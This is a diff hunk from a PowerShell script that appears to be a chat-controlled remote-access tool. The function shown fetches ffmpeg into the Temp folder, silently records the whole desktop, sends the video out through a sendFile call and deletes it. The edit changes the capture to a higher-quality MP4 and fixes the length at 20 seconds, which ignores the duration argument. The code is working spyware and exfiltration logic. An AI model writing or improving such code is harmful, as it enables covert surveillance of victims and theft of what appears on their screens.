@@ -930,9 +930,10 @@ param ([int[]]$t)
         GetFfmpeg
     }
     sendMsg -Message ":arrows_counterclockwise: ``Recording screen for $t seconds..`` :arrows_counterclockwise:"
-    $mkvPath = "$env:Temp\ScreenClip.mkv"
+    $mkvPath = "$env:Temp\ScreenClip.mp4"
     if ($t.Length -eq 0){$t = 10}
-    .$env:Temp\ffmpeg.exe -f gdigrab -t 10 -framerate 30 -i desktop $mkvPath
+    .$env:Temp\ffmpeg.exe -f gdigrab -framerate 10 -t 20 -i desktop -vcodec libx264 -preset fast -crf 18 -pix_fmt yuv420p -movflags +faststart $mkvPath
+    # .$env:Temp\ffmpeg.exe -f gdigrab -t 10 -framerate 30 -i desktop $mkvPath
     sendFile -sendfilePath $mkvPath | Out-Null
     sleep 5
     rm -Path $mkvPath -Force
